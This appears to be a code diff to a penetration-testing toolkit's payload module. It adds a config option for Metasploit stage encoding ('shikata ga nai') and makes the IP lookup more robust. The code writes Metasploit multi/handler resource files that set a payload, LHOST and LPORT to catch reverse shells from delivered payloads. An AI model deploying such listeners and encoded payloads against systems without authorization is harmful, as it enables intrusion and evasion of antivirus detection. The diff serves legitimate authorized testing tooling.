@@ -11,11 +11,13 @@ from src.core.setcore import *
 from src.core.menu.text import *
 from src.core.dictionaries import *
 
-if len(check_options("IPADDR=")) > 2:
-    ipaddr = check_options("IPADDR=")
-else:
+try:
+    if len(check_options("IPADDR=")) > 2:
+        ipaddr = check_options("IPADDR=")
+    else:
+        ipaddr = ""
+except: 
     ipaddr = ""
-
 
 me = mod_name()
 listener="notdefined"
@@ -24,6 +26,11 @@ sys.path.append(definepath)
 port1 = "8080"
 port2 = "8081"
 operating_system = check_os()
+
+# check stage encoding - shikata ga nai for payload delivery
+stage_encoding = check_config("STAGE_ENCODING=").lower()
+if stage_encoding == "off": stage_encoding = "false"
+else: stage_encoding = "true"
 
 # grab configuration options
 encount="4"
@@ -450,7 +457,7 @@ try:
                                 filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
                                 port_check = check_ports("%s/meta_config_multipyinjector" % (setdir), shellcode_port)
                                 if port_check == False:
-                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding true\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n\n" % (choice9, ipaddr, shellcode_port))
+                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n\n" % (choice9, stage_encoding,ipaddr, shellcode_port))
                                     filewrite.close()
 
                             if validate_ip(choice2) == False:
@@ -762,7 +769,7 @@ try:
                     if flag == 0:
                         filewrite.write("set LPORT "+choice3+"\n")
 
-                    filewrite.write("set EnableStageEncoding true\n")
+                    filewrite.write("set EnableStageEncoding %s\n" % (stage_encoding))
                     filewrite.write("set ExitOnSession false\n")
 
                     if auto_migrate == "ON":
